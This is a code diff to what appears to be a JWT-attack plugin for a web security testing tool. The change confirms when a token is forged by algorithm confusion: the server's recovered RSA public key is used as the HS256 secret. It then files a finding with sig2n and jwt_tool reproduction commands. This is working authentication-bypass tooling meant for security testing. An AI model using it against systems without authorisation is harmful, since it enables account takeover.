@@ -556,7 +556,13 @@ async function runRecoveredConfusion(
   sdk: SDK<API, BackendEvents>,
   requestId: string,
   keys: Array<{ nHex: string; e: number }>,
-  sessionId: string
+  sessionId: string,
+  opts?: {
+    baselineStatus?: number;
+    baselineLength?: number;
+    sigValidated?: boolean;   // server rejects invalid signatures (baseline ≠ invalid-sig)
+    candidateJwts?: string[]; // the JWTs recovery used — for the sig2n repro command
+  }
 ): Promise<{ ok: boolean; count: number; pems: string[] }> {
   if (!keys.length) return { ok: false, count: 0, pems: [] };
   const pems = keys.map((k) => bigintToPublicKeyPem(BigInt("0x" + k.nHex), BigInt(k.e)));
@@ -574,11 +580,25 @@ async function runRecoveredConfusion(
 
   sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: pems });
 
+  // A forged recovered-key token "works" if it matches the baseline while the
+  // server otherwise rejects invalid signatures.
+  const bLen = opts?.baselineLength ?? 0;
+  const matchesBaseline = (a: AttackResult) =>
+    !!opts?.sigValidated &&
+    a.responseStatus !== undefined &&
+    opts.baselineStatus !== undefined &&
+    a.responseStatus === opts.baselineStatus &&
+    Math.abs((a.responseLength ?? 0) - bLen) <= Math.max(32, Math.floor(bLen * 0.05));
+  const jwt1 = opts?.candidateJwts?.[0] ?? "<JWT-token1>";
+  const jwt2 = opts?.candidateJwts?.[1] ?? "<JWT-token2>";
+
   for (const attack of extra) {
+    let sentReq: { getHost(): string; getPath(): string } | undefined;
     try {
       const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
       const start = Date.now();
       const sent = await sdk.requests.send(attackSpec as unknown as Parameters<typeof sdk.requests.send>[0]);
+      sentReq = sent.request as unknown as { getHost(): string; getPath(): string };
       attack.durationMs = Date.now() - start;
       attack.requestId = sent.request?.getId();
       if (sent.response) {
@@ -593,6 +613,35 @@ async function runRecoveredConfusion(
       attack.error = (e as Error).message;
     }
     sdk.api.send("jwt-attack-result", { sessionId, result: attack });
+
+    // Finding: the forged token (algorithm confusion with the recovered key) was accepted.
+    if (sentReq && !attack.error && matchesBaseline(attack)) {
+      try {
+        const b64 = (attack.keyPem ?? "").replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
+        const title = "JWT algorithm confusion via recovered public key accepted";
+        await sdk.findings.create({
+          title,
+          reporter: "JWT Attacker",
+          dedupeKey: `jwt-attacker:recovered-confusion:${sentReq.getHost()}${sentReq.getPath()}`,
+          request: sentReq as unknown as Parameters<typeof sdk.findings.create>[0]["request"],
+          description:
+            `**${title}.**\n\n` +
+            "The server's RSA public key was recovered from captured JWTs (silentsignal rsa_sign2n), then " +
+            "used as the HMAC secret to forge an HS256 token (algorithm confusion). The forged token was " +
+            `accepted: its response matched the baseline (HTTP ${attack.responseStatus}, ~${attack.responseLength} ` +
+            "bytes), while a token with an invalid signature was rejected — confirming the bypass. Forged tokens " +
+            "with arbitrary claims would be accepted.\n\n" +
+            "**REPRODUCE WITH SIG2N and JWT_TOOL:**\n\n" +
+            "```\n" +
+            `docker run --rm -it portswigger/sig2n ${jwt1} ${jwt2}\n` +
+            `echo -n ${b64} | base64 -d > /tmp/recoveredkey\n` +
+            `python3 jwt_tool.py ${originalJWT} -X k -pk /tmp/recoveredkey\n` +
+            "```",
+        });
+      } catch (e) {
+        sdk.console.log(`[JWT Attacker] recovered-confusion finding failed: ${(e as Error).message}`);
+      }
+    }
   }
   return { ok: true, count: extra.length, pems };
 }
